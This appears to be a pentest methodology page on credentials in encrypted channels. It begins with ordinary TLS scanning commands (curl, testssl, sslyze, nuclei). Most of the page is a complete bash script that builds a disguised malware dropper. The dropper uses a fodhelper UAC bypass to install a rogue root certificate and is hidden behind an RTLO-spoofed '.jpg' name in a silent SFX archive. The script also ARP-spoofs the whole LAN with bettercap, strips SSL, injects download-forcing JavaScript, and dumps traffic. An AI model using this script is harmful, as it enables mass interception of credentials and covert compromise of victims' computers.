# Credentials Encrypted Channel

## Check List

* [ ] Identify sensitive information transmitted through the various channels.
* [ ] Assess the privacy and security of the channels used.

## Methodology&#x20;

### Black Box

#### Credentials Encrypted Channel

{% stepper %}
{% step %}
Using the first command that is entered by the cURL tool, get the SSL versions of the target and see if it is vulnerable or not
{% endstep %}

{% step %}
Then, check the server service on each port for TLS/SSL support using the next command
{% endstep %}

{% step %}
Then, using the Nuclei tool, we check the presence of vulnerabilities in TLS/SSL, and if it is vulnerable, we detect MITM vulnerabilities using the created script
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet

### Scan Vulns

#### [cURL](https://curl.se/)

```bash
curl -vk --sslv2 --head https://$WEBSITE; \
curl -vk --sslv3 --head https://$WEBSITE; \
curl -vk --tlsv1.1 --head https://$WEBSITE; \
curl -vk --tlsv1.2 --head https://$WEBSITE; \
curl -vk --tlsv1.3 --head https://$WEBSITE;
```

#### [testssl.sh](https://github.com/testssl/testssl.sh)

```bash
testssl $WEBSITE
```

#### [SSLyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze $WEBSITE
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/main/ssl)

{% hint style="info" %}
Misconf & Vulns
{% endhint %}

```bash
nuclei -tags ssl -u https://$WEBSITE
```

### Man In The Middle

#### [Bettercap](https://www.bettercap.org/)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash
set -euo pipefail

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Variables
MITM_DIR="/usr/share/bettercap/caplets/unk9vvn"
BUILD_DIR="$HOME/.wine/drive_c/pyinstaller-build"
ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
RTLO=$'\xE2\x80\xAE'
DEPS="bettercap arp-scan openssl imagemagick wine winetricks rar apache2 python3 python3-pip"

# Install Dependencies
color_print CYAN "[*] Checking and installing dependencies..."
for pkg in $DEPS; do
    dpkg -s "$pkg" &>/dev/null || { color_print YELLOW "[!] Installing $pkg ..."; apt install -y "$pkg"; }
done

# PyInstaller on Wine
wine pyinstaller --version &>/dev/null || {
    color_print YELLOW "[!] Installing PyInstaller in Wine..."
    wine pip3 install --upgrade pip setuptools wheel
    wine pip3 install pyinstaller
}

# Cleanup Old Files
color_print YELLOW "[*] Cleaning old files..."
rm -rf "$MITM_DIR" "$BUILD_DIR"
mkdir -p "$MITM_DIR" "$BUILD_DIR"

# Network Info
IFACE=$(ip route | awk '/^default/ {print $5; exit}')
LAN=$(hostname -I | awk '{print $1}')
GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')

# Generate Fake Certificate
color_print CYAN "[*] Generating fake certificate..."
openssl x509 -in "/root/.bettercap-ca.cert.pem" -outform DER -out "$MITM_DIR/bettercap-ca.cer"

# Download & Create Icon
color_print CYAN "[*] Downloading & creating icon..."
wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"

# Build cert_installer.exe
color_print GREEN "[*] Building Windows cert_installer.exe..."
CERT_B64=$(base64 -w0 "$MITM_DIR/bettercap-ca.cer")
CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed 's/^/"/;s/$/",/')

cat > "$MITM_DIR/cert_installer.py" <<EOF
import os, sys, ctypes, subprocess, base64, tempfile, winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Build command to relaunch this script elevated
    cmd = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}" bypass'
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
            r"Software\\Classes\\ms-settings\\Shell\\Open\\command")
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
    except Exception:
        sys.exit(1)

    # Trigger fodhelper.exe (auto-elevated, no UAC prompt)
    subprocess.Popen([os.path.join(os.environ["WINDIR"], "System32", "fodhelper.exe")])
    sys.exit()

# If started by fodhelper → clean registry
if len(sys.argv) > 1 and sys.argv[1] == "bypass":
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
            r"Software\\Classes\\ms-settings\\Shell\\Open\\command")
    except: pass

CERT_B64_CHUNKS = [
$CHUNKS
]
CERT_B64 = ''.join(CERT_B64_CHUNKS)

path = os.path.join(tempfile.gettempdir(), "google.cer")
with open(path, "wb") as f:
    f.write(base64.b64decode(CERT_B64))

subprocess.run(
    ["certutil", "-addstore", "-f", "Root", path],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)

try:
    os.remove(path)
except FileNotFoundError:
    pass
EOF

cat > "$BUILD_DIR/admin.manifest" <<EOF
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
EOF

cp "$MITM_DIR/cert_installer.py" "$BUILD_DIR/"
cp "$MITM_DIR/google.ico" "$BUILD_DIR/"

cd "$BUILD_DIR"
wine pyinstaller --onefile --noconsole \
    --icon "C:\\pyinstaller-build\\google.ico" \
    --name "cert_installer.exe" \
    --manifest "C:\\pyinstaller-build\\admin.manifest" \
    "C:\\pyinstaller-build\\cert_installer.py" &>/dev/null

cp "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"

# Create SFX Archive
color_print CYAN "[*] Creating SFX archive..."
cat > "$MITM_DIR/sfx.txt" <<EOF
Setup=cert_installer.exe
Presetup=google.jpg
TempMode
Silent=1
Overwrite=1
Update=U
SetupIcon=google.ico
EOF

cd "$MITM_DIR"
rar a -sfx -z"$MITM_DIR/sfx.txt" \
    "/var/www/html/google_update${RTLO}gpj.exe" \
    "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico" &>/dev/null

# Scan Network & Format Targets
color_print CYAN "[*] Scanning network..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
    awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
    grep -v -E "^($LAN|$GATEWAY)$" | sort -u | tr '\n' ',' | sed 's/,$//')

# Generate Cross-Browser JS
cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
(function() {
    function injectDownloader() {
        try {
            var link = document.createElement('a');
            link.href = 'http://$LAN/google_update${RTLO}gpj.exe';
            link.download = 'google_update${RTLO}gpj.exe';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            var iframe = document.createElement('iframe');
            iframe.src = 'http://$LAN/google_update${RTLO}gpj.exe';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        } catch(e) { console.error('Injection failed:', e); }
    }
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', injectDownloader);
    } else { injectDownloader(); }
})();
EOF

# Generate Safe Bettercap Caplet
cat > "$MITM_DIR/cert_injector.cap" <<EOF
# Recon Targets
net.probe on

# Sniff Traffic
net.sniff on

# HTTP/HTTPS Intercept
set http.proxy.sslstrip true
set https.proxy.sslstrip true
set http.proxy.injectjs $MITM_DIR/rtlo_downloader.js
set https.proxy.injectjs $MITM_DIR/rtlo_downloader.js
http.proxy on
https.proxy on

# ARP Spoofing
set arp.spoof.targets $TARGETS
set arp.spoof.internal true
arp.spoof on

# Event Logs
set events.stream.output /tmp/mitm.log
set events.stream.http.request.dump true
set events.stream.http.response.dump true
EOF
chmod +x "$MITM_DIR/cert_injector.cap"

# Restart Apache Server
color_print GREEN "[*] Restarting Apache..."
service apache2 restart

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Launch Bettercap
bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
